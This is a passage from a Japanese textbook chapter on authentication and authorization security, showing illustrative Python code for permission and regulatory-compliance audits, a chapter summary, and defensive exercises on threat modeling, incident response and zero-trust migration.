                    over_privileged_users = await self.find_over_privileged_users()
                    
                    for user in over_privileged_users:
                        findings.append({
                            'severity': 'HIGH',
                            'finding': '過剰な権限を持つユーザー',
                            'user_id': user.id,
                            'excessive_permissions': user.excessive_permissions,
                            'recommendation': '最小権限の原則に基づく見直し'
                        })
                    
                    # 2. 孤立した権限
                    orphaned_permissions = await self.find_orphaned_permissions()
                    
                    if orphaned_permissions:
                        findings.append({
                            'severity': 'MEDIUM',
                            'finding': '孤立した権限が存在',
                            'count': len(orphaned_permissions),
                            'details': orphaned_permissions[:10]  # 最初の10件
                        })
                    
                    # 3. 権限の不整合
                    inconsistencies = await self.find_permission_inconsistencies()
                    
                    for inconsistency in inconsistencies:
                        findings.append({
                            'severity': 'MEDIUM',
                            'finding': '権限の不整合',
                            'type': inconsistency.type,
                            'affected_resources': inconsistency.resources
                        })
                    
                    # 4. 長期間未使用の権限
                    unused_permissions = await self.find_unused_permissions(days=90)
                    
                    if unused_permissions:
                        findings.append({
                            'severity': 'LOW',
                            'finding': '長期間未使用の権限',
                            'count': len(unused_permissions),
                            'recommendation': '定期的な権限レビュープロセスの実施'
                        })
                    
                    return AuditResult(
                        area='Permission Assignments',
                        findings=findings,
                        compliance_score=self.calculate_compliance_score(findings)
                    )
                
                async def audit_role_definitions(self) -> AuditResult:
                    """ロール定義の監査"""
                    
                    findings = []
                    
                    # ロールの複雑性分析
                    role_complexity = await self.analyze_role_complexity()
                    
                    if role_complexity.average_permissions_per_role > 50:
                        findings.append({
                            'severity': 'MEDIUM',
                            'finding': 'ロールが過度に複雑',
                            'average_permissions': role_complexity.average_permissions_per_role,
                            'recommendation': 'ロールの細分化と整理'
                        })
                    
                    # ロールの重複
                    duplicate_roles = await self.find_duplicate_roles()
                    
                    for dup in duplicate_roles:
                        findings.append({
                            'severity': 'LOW',
                            'finding': '重複するロール定義',
                            'roles': dup.role_names,
                            'overlap_percentage': dup.overlap_percentage
                        })
                    
                    # 危険な権限の組み合わせ
                    dangerous_combinations = await self.find_dangerous_permission_combinations()
                    
                    for combo in dangerous_combinations:
                        findings.append({
                            'severity': 'HIGH',
                            'finding': '危険な権限の組み合わせ',
                            'role': combo.role_name,
                            'permissions': combo.dangerous_permissions,
                            'risk': combo.risk_description
                        })
                    
                    return AuditResult(
                        area='Role Definitions',
                        findings=findings,
                        compliance_score=self.calculate_compliance_score(findings)
                    )
            ''',
            
            'compliance_audit': '''
            class ComplianceAudit:
                """コンプライアンス監査"""
                
                async def audit_regulatory_compliance(self) -> ComplianceReport:
                    """規制要件への準拠状況監査"""
                    
                    report = ComplianceReport()
                    
                    # GDPR準拠
                    if self.is_gdpr_applicable():
                        gdpr_audit = await self.audit_gdpr_compliance()
                        report.add_regulation('GDPR', gdpr_audit)
                    
                    # PCI-DSS準拠（カード情報を扱う場合）
                    if self.handles_payment_cards():
                        pci_audit = await self.audit_pci_dss_compliance()
                        report.add_regulation('PCI-DSS', pci_audit)
                    
                    # SOC2準拠
                    soc2_audit = await self.audit_soc2_compliance()
                    report.add_regulation('SOC2', soc2_audit)
                    
                    # HIPAA準拠（医療情報を扱う場合）
                    if self.handles_health_data():
                        hipaa_audit = await self.audit_hipaa_compliance()
                        report.add_regulation('HIPAA', hipaa_audit)
                    
                    return report
                
                async def audit_gdpr_compliance(self) -> RegulatoryAuditResult:
                    """GDPR準拠監査"""
                    
                    findings = []
                    
                    # 同意管理
                    consent_audit = await self.audit_consent_management()
                    if not consent_audit.explicit_consent_implemented:
                        findings.append({
                            'requirement': 'GDPR Article 7 - Consent',
                            'status': 'NON_COMPLIANT',
                            'finding': '明示的な同意取得メカニズムが不足',
                            'remediation': '同意管理システムの実装'
                        })
                    
                    # データポータビリティ
                    portability_audit = await self.audit_data_portability()
                    if not portability_audit.export_functionality_exists:
                        findings.append({
                            'requirement': 'GDPR Article 20 - Data Portability',
                            'status': 'NON_COMPLIANT',
                            'finding': 'データエクスポート機能が未実装',
                            'remediation': 'ユーザーデータエクスポートAPIの開発'
                        })
                    
                    # 忘れられる権利
                    erasure_audit = await self.audit_right_to_erasure()
                    if erasure_audit.average_erasure_time > 30:
                        findings.append({
                            'requirement': 'GDPR Article 17 - Right to Erasure',
                            'status': 'PARTIAL_COMPLIANT',
                            'finding': 'データ削除に30日以上かかる',
                            'current_average': erasure_audit.average_erasure_time,
                            'remediation': '削除プロセスの自動化'
                        })
                    
                    return RegulatoryAuditResult(
                        regulation='GDPR',
                        findings=findings,
                        overall_compliance=self.calculate_gdpr_compliance_score(findings)
                    )
            '''
        }
```

## まとめ

この章では、認証認可システムのセキュリティと脅威対策について学びました：

1. **主要な攻撃手法と対策**
   - ブルートフォース、パスワードスプレー攻撃への対策
   - セッション関連攻撃の防御
   - 権限昇格攻撃の検知と防止

2. **ペネトレーションテスト**
   - 体系的なテスト計画の立案
   - 認証・認可の脆弱性テスト
   - 実践的なテストケース

3. **インシデント対応**
   - インシデントの分類と対応フロー
   - 封じ込め、根絶、復旧のプロセス
   - 事後分析と改善

4. **定期的なセキュリティ監査**
   - 包括的な監査チェックリスト
   - コンプライアンス要件の確認
   - 継続的な改善プロセス

次章では、パフォーマンスとスケーラビリティについて学びます。

## 演習問題

### 問題1：脅威モデリング
以下のシステムに対する脅威モデルを作成しなさい：
- 銀行のオンラインバンキングシステム
- 100万ユーザー、24時間365日稼働
- モバイルアプリとWebの両方に対応
- 送金、残高照会、定期振込などの機能

### 問題2：攻撃シミュレーション
以下の攻撃に対する防御コードを実装しなさい：
- タイミング攻撃を考慮したユーザー認証
- レインボーテーブル攻撃に強いパスワード保存
- セッション固定攻撃の防御
- CSRFトークンの実装

### 問題3：インシデント対応計画
Eコマースサイトで以下のインシデントが発生した場合の対応計画を作成しなさい：
- 管理者アカウントへの不正アクセスを検知
- 過去48時間のアクセスログに異常
- 一部の顧客データが閲覧された可能性
- 現在もシステムは稼働中

### 問題4：セキュリティ監査
中規模SaaS企業（従業員200名、顧客5000社）の認証認可システムの監査計画を作成しなさい。以下を含めること：
- 監査スコープと目標
- 監査手法とツール
- タイムライン（3ヶ月間）
- 成果物とレポート形式

### 問題5：ゼロトラスト移行
従来の境界型セキュリティからゼロトラストアーキテクチャへの移行計画を作成しなさい：
- 現状分析（AsIs）
- 目標アーキテクチャ（ToBe）
- 移行ステップ（6ヶ月計画）
- リスクと対策
